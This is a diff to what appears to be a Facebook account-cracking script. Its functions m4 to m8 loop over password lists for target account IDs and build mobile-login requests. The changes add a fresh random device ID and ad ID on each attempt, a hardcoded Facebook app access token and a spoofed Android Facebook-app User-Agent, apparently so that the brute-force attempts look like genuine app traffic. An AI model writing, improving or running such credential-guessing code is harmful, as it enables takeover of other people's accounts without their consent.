@@ -1165,6 +1165,10 @@ def m4(idf,pwv):
     sys.stdout.flush()
     try:
       for pw in pwv:
+            device_id = str(uuid.uuid4())
+            adid = str(uuid.uuid4())
+            pas = rmpassconf(ids,pas)
+            accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
             data = {
             'adid':adid,
             'format':'json',
@@ -1204,7 +1208,7 @@ def m4(idf,pwv):
             'X-FB-Connection-Type':'unknown',
             'X-FB-connection-quality':'EXCELLENT',
             "X-Tigon-Is-Retry": "False",
-            'User-Agent': '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';{R1}',
+            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 11; RMX2027 Build/RP1A.200720.011) [FBAN/FB4A;FBAV/258.0.0.34.119;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/199294666;FBCR/IND airtel;FBMF/realme;FBBD/realme;FBDV/RMX2027;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1448};FB_FW/1;FBRV/0;]',
             "X-FB-connection-token": "d29d67d37eca387482a8a5b740f84f62",
             'Accept-Encoding':'gzip, deflate',
             'Content-Type': 'application/x-www-form-urlencoded',
@@ -1243,6 +1247,10 @@ def m5(idf,pwv):
     sys.stdout.flush()
     try:
       for pw in pwv:
+            device_id = str(uuid.uuid4())
+            adid = str(uuid.uuid4())
+            pas = rmpassconf(ids,pas)
+            accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
             data = {
             'adid':adid,
             'format':'json',
@@ -1282,7 +1290,7 @@ def m5(idf,pwv):
             'X-FB-Connection-Type':'unknown',
             'X-FB-connection-quality':'EXCELLENT',
             "X-Tigon-Is-Retry": "False",
-            'User-Agent': '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';{R1}',
+            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 11; RMX2027 Build/RP1A.200720.011) [FBAN/FB4A;FBAV/258.0.0.34.119;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/199294666;FBCR/IND airtel;FBMF/realme;FBBD/realme;FBDV/RMX2027;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1448};FB_FW/1;FBRV/0;]',
             "X-FB-connection-token": "d29d67d37eca387482a8a5b740f84f62",
             'Accept-Encoding':'gzip, deflate',
             'Content-Type': 'application/x-www-form-urlencoded',
@@ -1321,6 +1329,10 @@ def m6(idf,pwv):
     sys.stdout.flush()
     try:
       for pw in pwv:
+            device_id = str(uuid.uuid4())
+            adid = str(uuid.uuid4())
+            pas = rmpassconf(ids,pas)
+            accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
             data = {
             'adid':adid,
             'format':'json',
@@ -1399,6 +1411,10 @@ def m7(idf,pwv):
     sys.stdout.flush()
     try:
       for pw in pwv:
+            device_id = str(uuid.uuid4())
+            adid = str(uuid.uuid4())
+            pas = rmpassconf(ids,pas)
+            accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
             data = {
             'adid':adid,
             'format':'json',
@@ -1477,6 +1493,10 @@ def m8(idf,pwv):
     sys.stdout.flush()
     try:
       for pw in pwv:
+            device_id = str(uuid.uuid4())
+            adid = str(uuid.uuid4())
+            pas = rmpassconf(ids,pas)
+            accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
             data = {
             'adid':adid,
             'format':'json',
